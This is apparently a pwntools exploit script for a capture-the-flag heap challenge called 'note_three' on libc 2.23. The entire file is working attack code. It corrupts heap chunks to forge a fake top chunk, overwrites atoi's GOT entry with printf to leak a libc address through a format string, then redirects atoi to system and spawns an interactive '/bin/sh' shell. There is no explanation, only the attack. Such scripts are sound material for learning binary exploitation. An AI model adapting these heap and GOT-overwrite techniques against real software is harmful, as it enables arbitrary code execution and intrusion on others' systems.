#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./note_three')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./note_three')

else:
    libc = ELF('./libc-2.23.so')

def New(idx,size,content):
    p.recvuntil('choice>> ')
    p.sendline('1')
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("size: ")
    p.sendline(str(size))
    p.recvuntil("content: ")
    p.send(content)

def Edit(idx,content):
    p.recvuntil('choice>> ')
    p.sendline('2')
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("content: ")
    p.send(content)

def exp():
    #leak libc
    #gdb.attach(p,'b* 0x400a97')
    for i in range(23):
        New(0,0x88,"0"*0x88)

    New(0,0x88,"0")#0
    New(1,0x88,"1"*0x80)#1 0x90
    New(2,0x88,'a'*0x30)#2
    Edit(2,'a'*0x30+p64(0)+p64(0xb1))

    New(0,0x90,"0"*0x90)
    #ub
    New(0,0x88,"a")#0
    heap_lis = 0x6020c0+0x100
    Edit(0,"a"*0x10+p64(0)+p64(0x71)+p64(0)+p64(heap_lis-0x10))
    New(1,0x68,'a'*0x60)
    #fake top
    Edit(0,p64(0x602048)+p64(0)+p64(0x6020c0+0x70)*2)
    gdb.attach(p)
    New(2,0x90,'a'*0x78+p64(0x91)+p64(0x6021b0)*2)
    atoi_got = elf.got['atoi']
    payload = 'a'*0x80+p64(0x6021c0)+p64(0x100)
    Edit(2,payload)
    printf_plt = elf.plt['printf']
    #New(1,0x78,"a"*0x78)
    Edit(0,p64(atoi_got)+p64(0x100)+p64(atoi_got))

    Edit(1,p64(printf_plt))
    #gdb.attach(p)
    #leak
    p.recvuntil("choice>> ")
    p.sendline("%19$p")
    p.recvuntil("0x")
    libc_base = int(p.recvline().strip("\n"),16) - 240 - libc.sym["__libc_start_main"]
    log.success("libc base => " + hex(libc_base))
    #get shell
    p.recvuntil("choice>> ")
    p.sendline("1")
    p.recvuntil("idx:")
    p.sendline()
    p.recvuntil("content: ")
    p.sendline(p64(libc_base+libc.sym["system"]))
    p.recvuntil("choice>> ")
    p.sendline("/bin/sh\x00")
    p.interactive()

exp()
